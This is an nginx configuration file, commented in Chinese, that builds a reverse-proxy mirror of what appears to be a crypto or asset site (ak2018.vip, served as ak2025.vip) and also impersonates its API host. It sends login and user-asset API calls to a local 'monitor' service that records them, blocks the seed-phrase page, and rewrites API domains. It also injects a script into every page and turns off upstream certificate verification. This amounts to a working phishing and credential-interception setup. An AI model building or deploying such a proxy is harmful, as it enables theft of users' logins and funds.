# Nginx完整代理配置 - 同时代理ak2025.vip和akapi1.com
# 解决移动设备访问问题

# 使用CPU核心数的worker进程
worker_processes auto;

# 提高文件描述符限制
worker_rlimit_nofile 65535;

events {
    # 每个worker进程的最大连接数
    worker_connections 10240;
    
    # 允许一次接受多个连接
    multi_accept on;
}

http {
    # ===== 性能优化 =====
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;
    
    # 增大缓冲区
    client_body_buffer_size 16k;
    client_max_body_size 10m;
    proxy_buffer_size 128k;
    proxy_buffers 4 256k;
    proxy_busy_buffers_size 256k;
    proxy_temp_file_write_size 256k;
    
    # Gzip压缩 (大幅提升传输速度)
    gzip on;
    gzip_vary on;
    gzip_proxied any;
    gzip_comp_level 6;
    gzip_min_length 1000;
    gzip_types text/plain text/css text/xml text/javascript 
               application/json application/javascript application/xml 
               application/xml+rss application/x-javascript
               image/svg+xml;
    
    # 静态文件缓存
    open_file_cache max=1000 inactive=20s;
    open_file_cache_valid 30s;
    open_file_cache_min_uses 2;
    open_file_cache_errors on;
    
    # MIME类型
    include mime.types;
    default_type application/octet-stream;
    
    # 日志格式
    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';
    
    access_log logs/access.log main;
    error_log logs/error.log;
    
    # 上游服务器配置
    upstream ak2018_backend {
        server ak2018.vip:443;
        keepalive 64;
        keepalive_requests 1000;
        keepalive_timeout 60s;
    }
    
    upstream akapi1_backend {
        server www.akapi1.com:443;
        keepalive 64;
        keepalive_requests 1000;
        keepalive_timeout 60s;
    }
    
    # 监控服务器 (本地Python服务)
    upstream monitor_backend {
        server 127.0.0.1:8080;
        keepalive 32;
    }
    
    # HTTP重定向到HTTPS
    server {
        listen 80;
        server_name ak2025.vip www.akapi1.com akapi1.com;
        return 301 https://$server_name$request_uri;
    }
    
    # ak2025.vip HTTPS代理 (主站点)
    server {
        listen 443 ssl http2;
        server_name ak2025.vip;
        
        # SSL证书配置
        ssl_certificate C:/Users/Administrator/Desktop/nginx-1.24.0/ssl/server.crt;
        ssl_certificate_key C:/Users/Administrator/Desktop/nginx-1.24.0/ssl/server.key;
        
        # SSL安全配置
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305;
        ssl_prefer_server_ciphers off;
        ssl_session_cache shared:SSL:50m;
        ssl_session_timeout 1d;
        ssl_session_tickets on;
        
        # ===== 拦截助记词页面，跳转到登录页 =====
        location /pages/center/security/mnemonic {
            return 302 /pages/account/login.html;
        }
        
        # ===== 监控服务相关路由 (优先匹配) =====
        
        # 管理后台
        location ^~ /admin {
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_http_version 1.1;
            proxy_connect_timeout 30s;
            proxy_read_timeout 300s;
        }
        
        # 聊天WebSocket
        location ^~ /chat {
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_http_version 1.1;
            proxy_read_timeout 86400;
        }
        
        # ===== 只拦截需要监控的API =====
        
        # 登录API - 经过监控服务器记录
        location = /RPC/Login {
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_connect_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
        }
        
        # 用户资产API - 经过监控服务器记录
        location = /RPC/public_IndexData {
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_connect_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
        }
        
        # ===== 其他RPC请求直接转发到后端API =====
        location /RPC/ {
            proxy_pass https://akapi1_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host www.akapi1.com;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_set_header Accept $http_accept;
            proxy_connect_timeout 30s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
        }
        
        # ===== 路径修复规则 (解决移动端卡住问题) =====
        location = /content/css/iconfont.css {
            rewrite ^ /content/font/iconfont.css break;
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host ak2018.vip;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        }
        
        location = /content/js/cn.json {
            rewrite ^ /content/lang/cn.json break;
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host ak2018.vip;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        }
        
        # ===== 静态资源缓存 =====
        location ~* \.(css|js|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$ {
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host ak2018.vip;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            expires 7d;
            add_header Cache-Control "public, max-age=604800, immutable";
        }
        
        # ===== 默认代理配置 =====
        location / {
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            
            proxy_set_header Host ak2018.vip;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # 强制桌面User-Agent
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
            
            proxy_connect_timeout 30s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            
            # 替换JS中的API域名
            sub_filter_types text/html text/javascript application/javascript;
            sub_filter_once off;
            sub_filter 'https://www.akapi1.com' 'https://ak2025.vip';
            sub_filter 'https://www.akapi3.com' 'https://ak2025.vip';
            sub_filter 'http://www.akapi1.com' 'https://ak2025.vip';
            sub_filter 'http://www.akapi3.com' 'https://ak2025.vip';
            
            # 注入聊天组件
            sub_filter '</body>' '<script src="/chat/widget.js"></script></body>';
        }
    }
    
    # akapi1.com HTTPS代理 (API服务器)
    server {
        listen 443 ssl http2;
        server_name www.akapi1.com akapi1.com;
        
        ssl_certificate C:/Users/Administrator/Desktop/nginx-1.24.0/ssl/server.crt;
        ssl_certificate_key C:/Users/Administrator/Desktop/nginx-1.24.0/ssl/server.key;
        
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305;
        ssl_prefer_server_ciphers off;
        ssl_session_cache shared:SSL:50m;
        ssl_session_timeout 1d;
        ssl_session_tickets on;
        
        location / {
            proxy_pass https://akapi1_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            
            proxy_set_header Host www.akapi1.com;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Accept $http_accept;
            proxy_set_header Content-Type $http_content_type;
            proxy_set_header Authorization $http_authorization;
            
            proxy_connect_timeout 30s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            
            # CORS支持
            add_header Access-Control-Allow-Origin * always;
            add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
            add_header Access-Control-Allow-Headers "DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization" always;
            
            if ($request_method = 'OPTIONS') {
                add_header Access-Control-Allow-Origin * always;
                add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
                add_header Access-Control-Allow-Headers "DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization" always;
                add_header Access-Control-Max-Age 1728000 always;
                add_header Content-Type 'text/plain; charset=utf-8' always;
                add_header Content-Length 0 always;
                return 204;
            }
        }
    }
}
